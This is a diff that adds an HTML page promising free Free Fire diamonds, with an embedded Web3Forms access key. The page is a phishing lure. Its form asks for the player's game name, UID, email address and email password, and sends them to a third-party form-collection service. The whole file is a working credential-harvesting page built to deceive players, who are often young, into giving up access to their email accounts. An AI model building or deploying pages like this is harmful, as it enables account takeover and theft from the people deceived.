@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Free Fire Diamonds</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="diamond-container">
+            <!-- OPTION 1: Using Emoji (Current) -->
+            <div class="diamond-emoji">💎</div>
+            
+            <!-- OPTION 2: Using Image (Uncomment below and comment out emoji above to use an image) -->
+            <!-- <img src="YOUR_IMAGE_URL_HERE" alt="Diamond" class="diamond-image"> -->
+        </div>
+
+        <h1>Claim Your Free Fire Diamonds</h1>
+
+        <form action="https://api.web3forms.com/submit" method="POST" id="claimForm">
+    <!-- Add your Web3Forms access key here -->
+    <input type="hidden" name="access_key" value="46a45158-946b-49b9-b46b-c790ed2fa822">
+    
+    <div class="form-group">
+        <label for="freefirename">Free Fire Name</label>
+        <input type="text" id="freefirename" name="freefirename" placeholder="Enter your Free Fire name" required>
+    </div>
+
+    <div class="form-group">
+        <label for="uid">UID</label>
+        <input type="text" id="uid" name="uid" placeholder="Enter your UID" required>
+    </div>
+
+    <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" placeholder="Enter your email address" required>
+    </div>
+
+    <div class="form-group">
+        <label form="Pass">Email Pass</label>
+        <input type="text" id="pass" name="pass" placeholder="Enter your email pass" required>
+    </div>
+
+    <button type="submit" class="claim-button">Claim Now</button>
+</form>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
